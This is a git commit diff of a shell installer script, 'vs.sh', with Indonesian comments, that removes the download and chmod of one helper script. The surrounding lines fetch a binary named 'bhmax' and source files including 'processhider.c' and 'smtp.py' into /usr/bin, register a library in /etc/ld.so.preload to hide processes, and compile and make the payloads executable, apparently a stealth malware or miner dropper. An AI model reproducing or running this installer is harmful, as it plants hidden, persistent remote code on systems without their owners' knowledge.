f6d05b89cb557caf5a16b4c0e72fd8c8ecb8bd0f
hudahadoh <168321021+hudahadoh@users.noreply.github.com>
2024-06-22 03:15:23 -0400

    Update vs.sh

--- vs.sh
+++ vs.sh
@@ -5,7 +5,6 @@ cd /usr/bin
 
 # Unduh file yang diperlukan
 wget https://github.com/hudahadoh/vs/raw/main/bhmax
-wget https://raw.githubusercontent.com/hudahadoh/vs/main/start.sh
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/hi.c
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/processhider.c
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py
@@ -22,7 +21,6 @@ echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 
 # Ubah izin agar bhmax dapat dieksekusi
 chmod +x bhmax
-chmod +x start.sh
 
 # Kompilasi hi.c menjadi hi
 gcc -o hi hi.c
